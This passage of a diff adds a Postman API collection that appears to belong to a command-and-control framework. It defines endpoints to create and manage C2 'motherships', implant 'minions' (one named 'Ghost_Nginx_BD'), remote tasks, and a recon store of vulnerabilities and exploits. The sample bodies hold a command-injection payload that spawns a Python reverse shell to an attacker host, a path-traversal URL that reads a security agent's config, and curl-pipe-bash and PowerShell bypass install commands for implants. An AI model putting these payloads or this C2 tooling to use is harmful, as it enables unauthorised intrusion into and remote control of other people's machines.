+              "raw": "{{url_endpoint}}/api/mothership/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "mothership",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Motherships",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"Beta-C2-Backup\",\n    \"address\": \"45.77.88.22\",\n    \"implant_tunnel\": \"https://backup.beta.io/imp\",\n    \"admin_tunnel\": \"https://backup.beta.io/adm\",\n    \"description\": \"Redundant failover node located in US-East.\",\n    \"tls\": false,\n    \"active\": true,\n    \"generate_command\": \"powershell.exe -ExecutionPolicy Bypass -File install.ps1\",\n    \"machine_data\": \"{\\\"username\\\": \\\"Administrator\\\", \\\"os_type\\\": \\\"windows\\\", \\\"home_dir\\\": \\\"C:\\\\Users\\\\Admin\\\"}\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/mothership/list?active=true&limit=10&offset=0",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "mothership",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "active",
+                  "value": "true"
+                },
+                {
+                  "key": "limit",
+                  "value": "10"
+                },
+                {
+                  "key": "offset",
+                  "value": "0"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View MS",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "\n{\n    \"email\":\"user@mail.com\",\n    \"password\":\"12345\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/mothership/view?msid=1Ca3HRrD1_iU2n1ZfNyP5YB",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "mothership",
+                "view"
+              ],
+              "query": [
+                {
+                  "key": "msid",
+                  "value": "1Ca3HRrD1_iU2n1ZfNyP5YB"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "New Request",
+          "request": {
+            "method": "GET",
+            "header": []
+          },
+          "response": []
+        },
+        {
+          "name": "List Filtered MS",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/mothership/list/filter?ownerid=12345&active=true&online=true&limit=5",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "mothership",
+                "list",
+                "filter"
+              ],
+              "query": [
+                {
+                  "key": "ownerid",
+                  "value": "12345"
+                },
+                {
+                  "key": "active",
+                  "value": "true"
+                },
+                {
+                  "key": "online",
+                  "value": "true"
+                },
+                {
+                  "key": "limit",
+                  "value": "5"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "New Request",
+          "request": {
+            "method": "GET",
+            "header": []
+          },
+          "response": []
+        },
+        {
+          "name": "Deactivate MS",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "\n{\n    \"email\":\"user@mail.com\",\n    \"password\":\"12345\"\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/mothership/deactivate?msid=1Ca3HRrD1_iU2n1ZfNyP5YB",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "mothership",
+                "deactivate"
+              ],
+              "query": [
+                {
+                  "key": "msid",
+                  "value": "1Ca3HRrD1_iU2n1ZfNyP5YB"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Update MS",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"ownerid\": \"123456\",\n    \"name\": \"Alpha-C2-Primary-v2\",\n    \"address\": \"192.168.1.105\",\n    \"motherships\": \"1Ca3JNY1A_Ev9QMRd8qsJbP\",\n    \"description\": \"Primary node updated with failover link to Beta.\",\n    \"tls\": true,\n    \"active\": true\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/mothership/update",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "mothership",
+                "update"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Minions",
+      "item": [
+        {
+          "name": "Create Minion",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"name\": \"Ghost_Nginx_BD\",\n    \"uname\": \"sam\",\n    \"groupid\": \"1000\",\n    \"homedir\": \"/home/sam\",\n    \"ostype\": \"linux\",\n    \"description\": \"Primary production agent for sam.\",\n    \"installed\": true,\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"address\": \"192.168.10.15\",\n    \"tunnel_address\": \"https://tunnel.odin-internal.com\",\n    \"tls\": true,\n    \"describers\": {\n        \"motherships\": [\n            {\"id\": \"Alpha-C2\", \"address\": \"192.168.1.100\"}\n        ]\n    },\n    \"is_dropper\": false,\n    \"generate_command\": \"curl -sL https://odin.io/install | bash\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/minion/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "minion",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View Minon",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"ownerid\": \"123456\",\n    \"name\": \"Alpha-C2-Primary-v2\",\n    \"address\": \"192.168.1.105\",\n    \"motherships\": \"1Ca3JNY1A_Ev9QMRd8qsJbP\",\n    \"description\": \"Primary node updated with failover link to Beta.\",\n    \"tls\": true,\n    \"active\": true\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/minion/view?minionid=1Ca3Zuqy2_BXsz3epLQH57D",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "minion",
+                "view"
+              ],
+              "query": [
+                {
+                  "key": "minionid",
+                  "value": "1Ca3Zuqy2_BXsz3epLQH57D"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Update Minion",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n        \"minionid\": \"1Ca3Zuqy2_BXsz3epLQH57D\",\n        \"name\": \"Ghost_Nginx_BD-Updated\",\n        \"uname\": \"sam\",\n        \"uid\": \"ec1563a7-f3dc-4f2b-a03f-f551768aa4bb\",\n        \"groupid\": \"1000\",\n        \"homedir\": \"/home/sam\",\n        \"ostype\": \"linux\",\n        \"description\": \"Primary production agent for sam.\",\n        \"installed\": true,\n        \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n        \"address\": \"192.168.10.15\",\n        \"port\": \"\",\n        \"motherships\": \"\",\n        \"tunnel_address\": \"https://tunnel.odin-internal.com\",\n        \"tls\": true,\n        \"active\": true,\n        \"describers\": {\n            \"motherships\": [\n                {\n                    \"address\": \"192.168.1.100\",\n                    \"id\": \"Alpha-C2\"\n                },\n                {\"id\": \"Backup-C2\", \"address\": \"44.201.12.55\"},\n                {\"id\": \"Peer T0 Peer C2\", \"address\": \"8.8.8.8\"}\n            ]\n        },\n        \"owner_id\": \"ec1563a7-f3dc-4f2b-a03f-f551768aa4bb\",\n        \"lastseen\": \"\",\n        \"is_dropper\": false,\n        \"generate_command\": \"curl -sL https://odin.io/install | bash\",\n        \"created_at\": \"2026-04-14T14:15:53Z\",\n        \"updated_at\": \"2026-04-14T14:36:38Z\"\n    },",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/minion/update",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "minion",
+                "update"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Owner Minions",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{url_endpoint}}/api/minion/list?limit=10&offset=0",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "minion",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "limit",
+                  "value": "10"
+                },
+                {
+                  "key": "offset",
+                  "value": "0"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Deactivate Minion",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"ownerid\": \"123456\",\n    \"name\": \"Alpha-C2-Primary-v2\",\n    \"address\": \"192.168.1.105\",\n    \"motherships\": \"1Ca3JNY1A_Ev9QMRd8qsJbP\",\n    \"description\": \"Primary node updated with failover link to Beta.\",\n    \"tls\": true,\n    \"active\": true\n}"
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/minion/deactivate?minionid=1Ca3Zuqy2_BXsz3epLQH57D",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "minion",
+                "deactivate"
+              ],
+              "query": [
+                {
+                  "key": "minionid",
+                  "value": "1Ca3Zuqy2_BXsz3epLQH57D"
+                }
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "RMM",
+      "item": [
+        {
+          "name": "Admin",
+          "item": [
+            {
+              "name": "Create Task",
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "POST",
+                "header": [],
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\n    \"command\": \"apt update\",\n    \"target_type\": \"linux\",\n    \"minion_ids\": [\n        \"1Ca3Zuqy2_BXsz3epLQH57D\",\n        \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n        \"Lnx-Dept-Server-05\"\n    ]\n}",
+                  "options": {
+                    "raw": {
+                      "language": "json"
+                    }
+                  }
+                },
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/task/create",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "task",
+                    "create"
+                  ]
+                }
+              },
+              "response": []
+            },
+            {
+              "name": "View RMM Task",
+              "protocolProfileBehavior": {
+                "disableBodyPruning": true
+              },
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "GET",
+                "header": [],
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"ownerid\": \"123456\",\n    \"name\": \"Alpha-C2-Primary-v2\",\n    \"address\": \"192.168.1.105\",\n    \"motherships\": \"1Ca3JNY1A_Ev9QMRd8qsJbP\",\n    \"description\": \"Primary node updated with failover link to Beta.\",\n    \"tls\": true,\n    \"active\": true\n}"
+                },
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/task/view?task_id=1Ca5RXxVt_DakwqXBpAhD2u",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "task",
+                    "view"
+                  ],
+                  "query": [
+                    {
+                      "key": "task_id",
+                      "value": "1Ca5RXxVt_DakwqXBpAhD2u"
+                    }
+                  ]
+                }
+              },
+              "response": []
+            },
+            {
+              "name": "Update RMM Task",
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "POST",
+                "header": [],
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\n    \"task_id\": \"1Ca5SBLto_VVHqHebTr6qdy\",\n    \"command\": \"apt-get update && apt-get upgrade -y wazuh-agent\",\n    \"target_type\": \"linux\",\n    \"minion_ids\": [\"1Ca3Zuqy2_BXsz3epLQH57D\"]\n}",
+                  "options": {
+                    "raw": {
+                      "language": "json"
+                    }
+                  }
+                },
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/task/update",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "task",
+                    "update"
+                  ]
+                }
+              },
+              "response": []
+            },
+            {
+              "name": "List My Tasks",
+              "protocolProfileBehavior": {
+                "disableBodyPruning": true
+              },
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "GET",
+                "header": [],
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"ownerid\": \"123456\",\n    \"name\": \"Alpha-C2-Primary-v2\",\n    \"address\": \"192.168.1.105\",\n    \"motherships\": \"1Ca3JNY1A_Ev9QMRd8qsJbP\",\n    \"description\": \"Primary node updated with failover link to Beta.\",\n    \"tls\": true,\n    \"active\": true\n}"
+                },
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/task/list",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "task",
+                    "list"
+                  ]
+                }
+              },
+              "response": []
+            },
+            {
+              "name": "List Executions By Status",
+              "protocolProfileBehavior": {
+                "disableBodyPruning": true
+              },
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "GET",
+                "header": [],
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\n    \"mothershipid\": \"1Ca3HRrD1_iU2n1ZfNyP5YB\",\n    \"ownerid\": \"123456\",\n    \"name\": \"Alpha-C2-Primary-v2\",\n    \"address\": \"192.168.1.105\",\n    \"motherships\": \"1Ca3JNY1A_Ev9QMRd8qsJbP\",\n    \"description\": \"Primary node updated with failover link to Beta.\",\n    \"tls\": true,\n    \"active\": true\n}"
+                },
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/executions/list?task_id=1Ca5SBLto_VVHqHebTr6qdy&verified=success",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "executions",
+                    "list"
+                  ],
+                  "query": [
+                    {
+                      "key": "task_id",
+                      "value": "1Ca5SBLto_VVHqHebTr6qdy"
+                    },
+                    {
+                      "key": "verified",
+                      "value": "success"
+                    }
+                  ]
+                }
+              },
+              "response": []
+            }
+          ]
+        },
+        {
+          "name": "Minion",
+          "item": [
+            {
+              "name": "Minion List Tasks",
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/minion/tasks?ostype=linux",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "minion",
+                    "tasks"
+                  ],
+                  "query": [
+                    {
+                      "key": "ostype",
+                      "value": "linux"
+                    }
+                  ]
+                }
+              },
+              "response": []
+            },
+            {
+              "name": "Minion Create Execution Report",
+              "request": {
+                "auth": {
+                  "type": "noauth"
+                },
+                "method": "POST",
+                "header": [],
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\n    \"task_id\": \"1Ca5RXxVt_DakwqXBpAhD2u\",\n    \"minionid\": \"1Ca3Zuqy2_BXsz3epLQH57D\",\n    \"status\": \"success\",\n    \"output\": \"wazuh-agent.service - Wazuh agent\\n   Loaded: loaded\\n   Active: active (running) since Wed 2026-04-15 13:10:05 EAT\",\n    \"verification_hash\": \"MD5_OF_TASKID_AND_MINIONID\"\n}",
+                  "options": {
+                    "raw": {
+                      "language": "json"
+                    }
+                  }
+                },
+                "url": {
+                  "raw": "{{url_endpoint}}/api/rmm/minion/report",
+                  "host": [
+                    "{{url_endpoint}}"
+                  ],
+                  "path": [
+                    "api",
+                    "rmm",
+                    "minion",
+                    "report"
+                  ]
+                }
+              },
+              "response": []
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Vulnerability and Exploits",
+      "item": [
+        {
+          "name": "Create Vulnerability",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"targetid\": \"60077e5848038468386282765ccd41b1\",\n    \"name\": 3,\n    \"severity\": 5,\n    \"at\": 1,\n    \"payload\": \"192.168.4.56; export RHOST='10.10.10.5'; export RPORT=4444; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"bash\\\")'\",\n    \"authenticated\": true,\n    \"works\": true,\n    \"details\": \"Command injection in the network diagnostics 'ping' utility. The input is concatenated directly into a shell command. Requires 'Network Operator' privileges but provides full reverse shell access as the 'www-data' user.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/vulnerability/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "vulnerability",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Vulnerabilities",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/vulnerability/list?target_id=60077e5848038468386282765ccd41b1",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "vulnerability",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "target_id",
+                  "value": "60077e5848038468386282765ccd41b1"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Create Exploit",
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"targetid\": \"60077e5848038468386282765ccd41b1\",\n    \"address\": \"http://dev-proxy.internal/view?page=../../etc/ossec.conf\",\n    \"average_severity\": 4,\n    \"grouped\": false,\n    \"grouped_vuns_ids\": [\"1Ca7FiDo1_SUDKCMPV6GrLW\"],\n    \"works\": true\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/exploit/create",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "exploit",
+                "create"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "List Exploits",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/exploit/list?targetid=60077e5848038468386282765ccd41b1",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "exploit",
+                "list"
+              ],
+              "query": [
+                {
+                  "key": "targetid",
+                  "value": "60077e5848038468386282765ccd41b1"
+                }
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "View Exploit",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{url_endpoint}}/api/recon/exploit/view?exploitid=1CaB9puJn_LQVbTmvprw27S",
+              "host": [
+                "{{url_endpoint}}"
+              ],
+              "path": [
+                "api",
+                "recon",
+                "exploit",
+                "view"
+              ],
+              "query": [
+                {
+                  "key": "exploitid",
+                  "value": "1CaB9puJn_LQVbTmvprw27S"
+                }
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Health",
+      "request": {
+        "auth": {
+          "type": "noauth"
+        },
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{url_endpoint}}/api/health",
+          "host": [
+            "{{url_endpoint}}"
+          ],
+          "path": [
+            "api",
+            "health"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "New Request",
+      "request": {
+        "method": "GET",
+        "header": []
+      },
+      "response": []
+    },
+    {
+      "name": "Create Task",
+      "request": {
+        "method": "GET",
+        "header": []
+      },
+      "response": []
+    },
+    {
+      "name": "New Request",
+      "request": {
+        "method": "GET",
+        "header": []
+      },
+      "response": []
+    }
+  ],
+  "auth": {
+    "type": "basic",
+    "basic": [
+      {
+        "key": "password",
+        "value": "12345",
+        "type": "string"
+      },
+      {
+        "key": "username",
+        "value": "sam@mail.com\"",
+        "type": "string"
+      }
+    ]
+  },
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "packages": {},
+        "requests": {},
+        "exec": [
+          ""
+        ]
+      }
+    },
+    {
+      "listen": "test",
+      "script": {
+        "type": "text/javascript",
+        "packages": {},
+        "requests": {},
+        "exec": [
+          ""
+        ]
+      }
+    }
+  ]
+}
